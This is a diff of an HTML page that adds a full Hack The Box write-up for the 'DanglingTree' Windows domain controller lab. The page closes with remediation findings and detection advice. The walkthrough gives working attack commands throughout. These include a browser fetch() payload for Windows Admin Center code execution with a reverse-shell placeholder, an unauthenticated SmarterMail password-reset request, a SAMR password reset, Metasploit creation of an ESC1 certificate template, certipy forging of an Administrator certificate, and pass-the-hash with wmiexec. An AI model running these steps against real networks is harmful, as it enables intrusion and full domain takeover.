@@ -4,15 +4,11 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>DanglingTree — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: DanglingTree — Medium Windows. A five-identity Active Directory chain ending in the box's signature flaw: a dangling ADCS certificate-template reference that turns a container write into ESC1 and full domain compromise.">
-  <link rel="stylesheet" href="../assets/style.css?v=4">
+  <meta name="description" content="Hack The Box: DanglingTree — Medium Windows AD. Five identities: Windows Admin Center RCE (CVE-2026-26119), an unauthenticated SmarterMail reset, a mailbox domain-swap, a SAMR password reset, and a dangling ADCS certificate template turned into ESC1 and Domain Admin.">
+  <link rel="stylesheet" href="../assets/style.css?v=5">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127795;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary and lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
@@ -24,7 +20,7 @@
     <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/danglingtree.png" alt="DanglingTree logo">
     <h1 style="margin-top:16px;">DanglingTree</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/DanglingTree" target="_blank" rel="noopener">app.hackthebox.com/machines/DanglingTree</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/DanglingTree" target="_blank" rel="noopener">app.hackthebox.com/machines/DanglingTree</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
       <span class="pill diff-medium">Medium</span>
@@ -34,79 +30,336 @@
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      A single-VM Windows Server 2025 <strong>Active Directory Domain Controller</strong> that lives up to
-      its name in the final act. Full compromise meant chaining through <strong>five identities</strong>, each
-      unlocked by a different technique — remote code execution in Windows Admin Center, an unauthenticated
-      reset in an internal mail server, a mailbox domain-swap trick to recover a hidden AD password, and a
-      SAMR password reset — to reach a user who could abuse the box's signature flaw: a <strong>dangling
-      AD Certificate Services template reference</strong>. The CA advertised certificate templates that no
-      longer existed as AD objects, so creating an object with the right name turned an ordinary container
-      permission into an <strong>ESC1</strong> path to Domain Admin.
+      <span class="tag">TL;DR</span>
+      A single-VM Windows Server 2025 <strong>Domain Controller</strong> that lives up to its name in the
+      final act. Full compromise meant chaining through <strong>five identities</strong>, each unlocked by a
+      different technique — RCE in Windows Admin Center, an unauthenticated reset in an internal mail
+      server, a mailbox domain-swap to recover a hidden AD password, and a SAMR password reset — to reach a
+      user who could abuse the box's signature flaw: a <strong>dangling AD Certificate Services template
+      reference</strong>. The CA advertised certificate templates that no longer existed as AD objects, so
+      creating an object with the right name turned an ordinary container permission into an
+      <strong>ESC1</strong> path to Domain Admin.
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
-    <p>
-      DanglingTree is a live <strong>Season 11</strong> machine, so in line with Hack The Box's guidance on
-      active machines I am not publishing the step-by-step reproduction, commands, credentials or flags. The
-      complete walkthrough — the full identity chain, the ADCS exploitation and a client-style remediation
-      plan — goes live here once the season closes.
-    </p>
-
-    <h2><span class="num">02</span>The interesting bits (no spoilers)</h2>
-    <h3>The name is the hint</h3>
-    <p>
-      A stale, unreachable DNS record for the bare domain name sits alongside the correct Domain Controller
-      record — quietly breaking any tool that resolves the domain instead of the host. That "dangling"
-      pattern turned out to be deliberate foreshadowing for the box's real vulnerability.
-    </p>
-    <h3>A certificate authority trusting ghosts</h3>
-    <p>
-      The heart of the box is an <strong>ADCS</strong> misconfiguration I hadn't hit in a lab before: the CA
-      published several certificate templates as "enabled" that <em>had no backing Active Directory object at
-      all</em>. Because the CA never re-validates that a published template still exists, anyone with write
-      access to the templates container can create an object under that exact name and instantly gain a live,
-      requestable — and in this case <strong>ESC1-vulnerable</strong> — template. A dangling reference became
-      a domain takeover.
-    </p>
-    <h3>Five identities, five different techniques</h3>
-    <p>
-      Getting to the account with that write access was the real work: a browser-driven RCE in a management
-      console, an <strong>unauthenticated password-reset</strong> flaw in an internal mail platform, a
-      creative mailbox domain-swap to read a password that wasn't meant to be reachable, an Active Directory
-      ACL edge, and a protocol switch to land a password reset the "normal" way refused to allow.
-    </p>
-    <h3>Picking the right protocol matters</h3>
-    <p>
-      Two steps only worked once I stopped fighting the obvious transport: LDAP password changes failed
-      consistently, but the <strong>SAMR</strong> protocol reset the account cleanly; and WinRM was filtered
-      from outside, so the final Domain-Admin shell came over RPC/SMB rather than the tool everyone reaches
-      for first.
-    </p>
-
-    <h2><span class="num">03</span>Takeaways</h2>
-    <ul>
-      <li><strong>Audit your CA for dangling templates.</strong> A certificate template published on the CA with no matching AD object is a latent domain-compromise primitive; reconcile the CA's published list against real objects and alert on the gap.</li>
-      <li><strong>Treat the certificate-templates container as Tier 0.</strong> <code>CreateChild</code> there is effectively "mint yourself a template" — it must never sit with a non-PKI-admin group.</li>
-      <li><strong>ESC1 is still the classic.</strong> Enrollee-supplied Subject Alternative Names plus enrol rights for everyone is all it takes to forge an Administrator certificate.</li>
-      <li><strong>Chains beat single bugs.</strong> No one flaw here was game-over on its own; five moderate issues across web, mail and AD composed into full compromise.</li>
-      <li>Straight into the day job: detection for new certificate-template objects, enrollee-supplied-SAN requests, SAMR password resets, management-console RCE and unauthenticated mail-admin calls, plus a Windows Server 2025 / DISA STIG and ADCS hardening baseline.</li>
-    </ul>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>danglingtree.htb</b> · host <code>dc.danglingtree.htb</code> · NetBIOS DANGLINGTREE</dd>
+      <dt>Host OS</dt><dd>Windows Server 2025 (build 26100) — Active Directory Domain Controller</dd>
+      <dt>Foothold</dt><dd>Guest SMB → leaked creds → <b>CVE-2026-26119</b> (Windows Admin Center RCE)</dd>
+      <dt>Privesc</dt><dd>SmarterMail unauth reset → mailbox domain-swap → ACL chain → SAMR reset → <b>ADCS ESC1</b></dd>
+    </dl>
 
     <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the enumeration, the five-identity chain, the dangling-template ESC1
-      exploitation to Domain Admin, and a prioritised remediation and hardening plan mapped to NIST 800-53/171,
-      the DISA Windows Server 2025 / Active Directory STIG and the CIS Benchmark.
+      <span class="tag">The chain in one line</span>
+      guest SMB → RoE PDF creds → WAC RCE as <code>anderson.w</code> → SmarterMail unauthenticated
+      force-reset → <code>svc_mail</code> → mailbox domain-swap / impersonate → <code>noah.b</code> (AD
+      foothold) → ACL chain → <code>alex.o</code> → SAMR password reset → <code>jake.h</code> →
+      <code>Template_Editors</code> CreateChild → dangling CA template (ESC1) → forged Administrator
+      certificate → NT hash → SYSTEM.
     </div>
+
+    <h2><span class="num">01</span>Recon</h2>
+    <p>A textbook AD Domain Controller port profile, with one port that does not belong:</p>
+    <pre data-lang="bash"><code>53   DNS          88   Kerberos     135  msrpc        139  netbios
+389  LDAP         445  SMB          464  kpasswd      593  http-rpc-epmap
+636  LDAPS        80/443 http(s)    3268/3269 GC LDAP(S)    3389 RDP
+6600 mshvlm   &lt;-- Windows Admin Center</code></pre>
+    <p>
+      One quirk mattered enough to cost me time later, so it goes first: the bare
+      <code>danglingtree.htb</code> name resolves through a <strong>stale, unreachable A record</strong>,
+      separate from the correct <code>dc.danglingtree.htb</code> record. Anything that resolves the domain
+      name and treats it as the DC host — certipy without <code>-dc-host</code>, for one — silently fails
+      with errors that look like permissions problems. Always pin the real hostname and IP.
+    </p>
+    <p>
+      That "dangling" DNS record is also deliberate foreshadowing. The box's real vulnerability is the same
+      pattern one layer up.
+    </p>
+
+    <h2><span class="num">02</span>Foothold — guest SMB to code execution</h2>
+    <h3>A readable share and a Rules of Engagement PDF</h3>
+    <p>
+      Guest SMB access was allowed, and the <code>IT</code> share was readable. It held a Rules of
+      Engagement PDF that carried initial credentials for <code>anderson.w</code> — the kind of document
+      that exists in every real environment and is almost never treated as a secret.
+    </p>
+    <pre data-lang="bash"><code>smbclient -N -L //&lt;dc-ip&gt;/            # enumerate shares as guest
+smbclient -N //&lt;dc-ip&gt;/IT             # pull the RoE PDF</code></pre>
+
+    <h3>Windows Admin Center RCE — CVE-2026-26119</h3>
+    <p>
+      Port 6600 is Windows Admin Center. Logged in as <code>anderson.w</code> in the browser, WAC's own
+      <code>invokeCommand</code> REST API will run arbitrary PowerShell in the WAC service context. In
+      DevTools, <code>allow pasting</code> first, then drive the API directly:
+    </p>
+    <pre data-lang="javascript"><code>fetch('/api/services/WinREST/PowerShell/nodes/dc/invokeCommand', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json; charset=UTF-8',
+    'X-Xsrf-Token': document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1],
+    'X-Ms-Sme-Module-Name': 'msft.sme.shell',
+    'X-Ms-Sme-Module-Version': '6.8.9'
+  },
+  body: JSON.stringify({ properties: {
+      script: "&lt;reverse-shell PowerShell one-liner&gt;",
+      command: "Get-WACSMServerConnectionStatus",
+      module: "Microsoft.SME.ServerManager",
+      state: "ready", useInProcRunspace: false, invokeMode: "Polling"
+  }})
+}).then(r =&gt; r.json()).then(console.log)</code></pre>
+    <p>That lands a shell as <code>danglingtree\anderson.w</code>.</p>
+
+    <h2><span class="num">03</span>svc_mail — an unauthenticated password reset</h2>
+    <p>
+      Internally, a customised <strong>SmarterMail</strong> instance listens on
+      <code>127.0.0.1:17017</code> — never exposed externally. A reverse tunnel gets you to it (chisel
+      works, but the client and server binary versions <em>must</em> match or the tunnel fails silently and
+      you will blame the wrong thing).
+    </p>
+    <p>
+      The endpoint <code>POST /api/v1/auth/force-reset-password</code> accepts an
+      <code>IsSysAdmin: true</code> flag and a target username <strong>with no authentication at all</strong>:
+    </p>
+    <pre data-lang="powershell"><code>Invoke-WebRequest -Uri "http://localhost:17017/api/v1/auth/force-reset-password" -Method POST `
+  -Body '{"IsSysAdmin":"true","OldPassword":"whatever","Username":"svc_mail",
+          "NewPassword":"&lt;newpass&gt;","ConfirmPassword":"&lt;newpass&gt;"}' `
+  -ContentType "application/json"</code></pre>
+    <p>
+      <code>svc_mail</code> is SmarterMail's PrimarySysAdmin, so that single unauthenticated call hands over
+      an admin console with <code>CanViewPasswords</code> (cleartext mailbox password recovery) and
+      <code>CanImpersonate</code>.
+    </p>
+
+    <h2><span class="num">04</span>noah.b — the domain-swap trick</h2>
+    <p>
+      Most of the harvested mailbox passwords do not reuse against real AD accounts. The one that does
+      belongs to <code>noah.b</code>, and <code>noah.b</code> has no mailbox on the live
+      <code>danglingtree.htb</code> domain at all — their data only exists in a detached secondary domain
+      folder, <code>danglingtree.htb.bak</code>. The console will not show you an account it is not serving.
+    </p>
+    <p>The way through is to make SmarterMail serve the detached data as if it were live:</p>
+    <ul>
+      <li>Rename the live domain's data folder aside.</li>
+      <li>Detach the live domain in the admin panel.</li>
+      <li>Recreate a domain object named <code>danglingtree.htb</code> whose Primary Path points at the renamed <code>.bak</code> folder.</li>
+      <li>Restart the mail service, then attach <code>noah.b@danglingtree.htb</code> under the new domain object.</li>
+      <li>Use the sysadmin <strong>Impersonate User</strong> feature and read the password straight out of account settings.</li>
+    </ul>
+    <p>
+      That password reuses on the real AD domain. <code>noah.b</code> is a dead end for direct privilege
+      escalation — not a local admin, not in Remote Management Users, WinRM denied even over loopback, no
+      useful ACL edges — but it is a genuine domain foothold, which is all the next stage needs.
+    </p>
+    <pre data-lang="bash"><code># enumerate from the new foothold
+bloodyAD --host &lt;dc-ip&gt; -d danglingtree.htb -u noah.b -p '&lt;pass&gt;' get writable
+# plus LDAP --computers and group dumps into BloodHound</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">05</span>alex.o and jake.h — chaining to a certificate-privileged account</h2>
+    <p>BloodHound from <code>noah.b</code> draws the rest of the path:</p>
+    <ul>
+      <li>A custom group <code>support-it</code>, whose sole member is <code>alex.o</code>, holds <code>ForceChangePassword</code> over <code>jake.h</code>.</li>
+      <li><code>jake.h</code> sits in <code>Helpdesk_Cert_Support</code> (on paper, <code>ManageCertificates</code> on the CA) and — far more interestingly — in a group called <code>Template_Editors</code>.</li>
+    </ul>
+    <p>
+      <code>alex.o</code>'s credentials came from reused external, OSINT-style creds that worked directly
+      against AD. Resetting <code>jake.h</code> from there is where the box gets fussy: LDAP password
+      changes (bloodyAD, a raw <code>unicodePwd</code> modify) consistently fail here, because they want
+      signed/sealed LDAPS that the target will not cooperate on. SAMR does it without complaint:
+    </p>
+    <pre data-lang="bash"><code>net rpc password jake.h '&lt;newpass&gt;' \
+  -U 'danglingtree.htb/alex.o%&lt;alex_pass&gt;' -S &lt;dc-ip&gt;</code></pre>
+
+    <h2><span class="num">06</span>The dangling template — ADCS ESC1</h2>
+    <p>Here is the box. <code>certipy-ad find</code> reports the CA publishing several templates as enabled:</p>
+    <pre data-lang="bash"><code>certipy-ad find -u jake.h@danglingtree.htb -p '&lt;jake_pass&gt;' \
+  -dc-ip &lt;dc-ip&gt; -dc-host dc.danglingtree.htb
+# enabled: RemoteAccessVPN, EmployeeAuthTemplate, VPNUserTemplate</code></pre>
+    <p>
+      Query AD for those objects and you get <code>noSuchObject</code>. <strong>They do not exist.</strong>
+      The CA is referencing templates that were deleted after being published, or never created — a dangling
+      reference, exactly like the stale DNS record in recon.
+    </p>
+    <p>
+      <code>Template_Editors</code> grants <code>CreateChild</code> on
+      <code>CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,…</code>. Because
+      the CA <em>already</em> treats one of those names as enabled and published, creating an AD object with
+      that exact name makes it live and requestable immediately — there is no separate "enable on the CA"
+      step, which is normally the part you cannot do without CA admin rights.
+    </p>
+    <p>
+      Populating the low-level PKI attributes (OIDs, flags, schema version) over raw LDAP is tedious, so I
+      used the Metasploit module that does it properly:
+    </p>
+    <pre data-lang="bash"><code>use auxiliary/admin/ldap/ad_cs_cert_template
+set RHOSTS &lt;dc-ip&gt;
+set USERNAME jake.h
+set PASSWORD &lt;jake_pass&gt;
+set DOMAIN danglingtree.htb
+set CERT_TEMPLATE RemoteAccessVPN
+set ACTION CREATE
+run
+set ACTION UPDATE
+set TEMPLATE_FILE &lt;metasploit's shipped esc1_template.yaml&gt;
+run</code></pre>
+    <p>
+      The shipped <code>esc1_template.yaml</code> configures exactly ESC1: <code>Enroll</code> granted to
+      <code>Authenticated Users</code>, and <code>msPKI-Certificate-Name-Flag</code> set to
+      <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> — the requester supplies an arbitrary SAN.
+    </p>
+
+    <h2><span class="num">07</span>Domain Admin via a forged certificate</h2>
+    <pre data-lang="bash"><code>certipy-ad req -u jake.h@danglingtree.htb -p '&lt;jake_pass&gt;' \
+  -dc-ip &lt;dc-ip&gt; -dc-host dc.danglingtree.htb \
+  -ca danglingtree-DC-CA -template RemoteAccessVPN \
+  -upn administrator@danglingtree.htb -sid S-1-5-21-…-500
+
+certipy-ad auth -pfx administrator.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+    <p>
+      Two details that will waste your afternoon if you skip them. The <code>-sid</code> is not optional:
+      without an explicit object SID pinned to Administrator's RID 500, <code>certipy-ad auth</code> refuses
+      to trust the UPN/SID mapping (this is StrongCertificateBindingEnforcement doing its job). And sync
+      your clock before authenticating — Kerberos is unforgiving about skew.
+    </p>
+    <p>
+      That returns the Administrator NT hash. WinRM (5985/5986) is filtered from outside, so evil-winrm is
+      not the way in; impacket over 135/445 is:
+    </p>
+    <pre data-lang="bash"><code>impacket-wmiexec administrator@&lt;dc-ip&gt; -hashes &lt;LM&gt;:&lt;NT&gt;</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">08</span>Dead ends — do not burn the time I did</h2>
+    <ul>
+      <li>
+        <strong>ESC7 via the <code>SubCA</code> template.</strong> <code>Helpdesk_Cert_Support</code> gives
+        <code>jake.h</code> <code>ManageCertificates</code>, so ESC7 looks like the intended path. It is
+        not. <code>-issue-request</code> is denied over every transport, <code>-dynamic-endpoint</code>
+        included, even as a verified group member. It is a red herring pointing at the right technology
+        and the wrong technique.
+      </li>
+      <li>
+        <strong>The dangling apex DNS record</strong> misdirects any tool that resolves the domain name
+        instead of the DC host. Always pass <code>-dc-host</code> and the real IP.
+      </li>
+      <li>
+        <strong>Password resets over LDAP.</strong> They fail consistently on this box. Use SAMR.
+      </li>
+    </ul>
+
+    <h2><span class="num">09</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>CA publishing certificate templates with no backing AD object</h4>
+      <p>
+        The CA advertised <code>RemoteAccessVPN</code>, <code>EmployeeAuthTemplate</code> and
+        <code>VPNUserTemplate</code> as enabled while none of them existed in AD. Combined with
+        <code>CreateChild</code> on the Certificate Templates container held by a non-PKI group, that turns
+        an ordinary container permission into a live, requestable, ESC1-vulnerable template and full domain
+        compromise.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Never leave a published template unbacked.</strong> Audit <code>certutil -CATemplates</code> and the CA's <code>certificateTemplates</code> attribute against the actual objects under <code>CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration</code>. Unpublish anything that does not resolve, and alert on a <code>noSuchObject</code> for a published template.</li>
+        <li><strong>Treat the Certificate Templates container as Tier 0.</strong> A non-PKI-admin group such as <code>Template_Editors</code> must never hold <code>CreateChild</code> there.</li>
+        <li><strong>Kill ESC1 at the source:</strong> remove <code>ENROLLEE_SUPPLIES_SUBJECT</code> from auth-capable templates and require CA manager approval for issuance.</li>
+        <li><strong>Enforce strong certificate binding</strong> (StrongCertificateBindingEnforcement, 2023 and later) so UPN/SID mismatches are rejected rather than trusted.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-6 least privilege · CM-6 / CM-7 baseline &amp; least functionality · IA-5(2) PKI-based authentication management · AU-6 audit review<br>
+        <b>DISA STIG:</b> Windows Server 2025 / Active Directory STIG — PKI template ACLs and CA configuration<br>
+        <b>CIS:</b> CIS Microsoft Windows Server Benchmark · ADCS hardening guidance<br>
+        <b>Vendor:</b> Microsoft ADCS ESC1–ESC8 guidance; KB on StrongCertificateBindingEnforcement; certutil template auditing
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Windows Admin Center remote code execution (CVE-2026-26119)</h4>
+      <p>
+        An authenticated low-privilege user reached arbitrary PowerShell execution in the WAC service
+        context through the <code>invokeCommand</code> API, on a gateway listening on 6600.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Patch Windows Admin Center</strong> to the fixed build.</li>
+        <li><strong>Never expose 6600 to untrusted networks</strong> — WAC is a management plane and belongs behind an admin network or jump host.</li>
+        <li><strong>Restrict gateway access and run WAC in a least-privilege service context</strong>, so RCE in the gateway is not RCE on the DC.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · SC-7 boundary protection · CM-7 least functionality · AC-6 least privilege
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · Critical</span>
+      <h4>SmarterMail unauthenticated force-reset-password</h4>
+      <p>
+        <code>POST /api/v1/auth/force-reset-password</code> accepted an <code>IsSysAdmin</code> flag from an
+        unauthenticated caller and reset the mail platform's PrimarySysAdmin, which then exposed cleartext
+        mailbox passwords and user impersonation.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Patch SmarterMail</strong>; the reset endpoint must require a valid sysadmin session, and privilege flags must never be caller-supplied.</li>
+        <li><strong>Do not bind a mail admin API to a reachable interface without authentication</strong> — loopback-only is not a control once an attacker has a shell.</li>
+        <li><strong>Turn off cleartext password recovery and impersonation</strong> unless there is a documented operational need, and audit their use.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · IA-2 identification &amp; authentication · AC-3 access enforcement · SC-7 boundary protection
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 4 · High</span>
+      <h4>AD ACL chain and credential reuse across mail, AD and external services</h4>
+      <p>
+        A helpdesk-style group held <code>ForceChangePassword</code> over a certificate-privileged user, and
+        the same passwords appeared across the mail platform, AD, and external breach data. Neither is a
+        vulnerability on its own; together they are the entire middle of the chain.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Tier your ACLs.</strong> Helpdesk groups must not hold password-reset rights over cert-privileged or Tier 0 accounts. Review continuously with BloodHound, not once a year.</li>
+        <li><strong>Break password reuse</strong> between mail, AD and external services; unique credentials for service accounts; monitor breach corpora for staff addresses.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-6 least privilege · AC-2 account management · IA-5 authenticator management · AU-6 audit review
+      </div>
+    </div>
+
+    <h2><span class="num">10</span>Detection — the blue-team side</h2>
+    <ul>
+      <li>Any <strong>new object created under the Certificate Templates container</strong> — this should be rare and always intentional.</li>
+      <li>A <strong>template published by the CA with no matching AD object</strong>, checked on a schedule.</li>
+      <li><strong>Certificate requests carrying an ENROLLEE_SUPPLIES_SUBJECT SAN that does not match the requester.</strong></li>
+      <li><strong>SAMR SetUserInfo password resets</strong>, especially against privileged or cert-adjacent accounts.</li>
+      <li><strong>WAC <code>invokeCommand</code> spawning shells</strong>, and any child process of the WAC service that is not expected.</li>
+      <li><strong>SmarterMail <code>force-reset-password</code> calls</strong>, and domain detach/attach operations on the mail platform.</li>
+    </ul>
+
+    <h2><span class="num">11</span>Takeaways</h2>
+    <ul>
+      <li><strong>A dangling reference is a vulnerability, not just untidiness.</strong> The stale DNS record and the unbacked CA template are the same bug at different layers — something authoritative pointing at something that no longer exists, and an attacker allowed to supply the missing half.</li>
+      <li><strong>The obvious ADCS path was the trap.</strong> ESC7 looked handed to me and went nowhere; the real path needed noticing that "enabled" and "exists" are different states.</li>
+      <li><strong>Loopback-only services are one shell away from public.</strong> The SmarterMail API was never internet-facing and it still gave up the mail platform.</li>
+      <li><strong>Know your protocols' quirks.</strong> LDAP password resets failed where SAMR worked, WinRM was filtered where WMI was not, and certipy needed an explicit SID. None of that is exploitation — it is just knowing the tools.</li>
+      <li><strong>Documents are credentials.</strong> The whole chain starts with a Rules of Engagement PDF sitting on a guest-readable share.</li>
+    </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer><div class="wrap">DanglingTree · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+  <footer><div class="wrap">DanglingTree · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
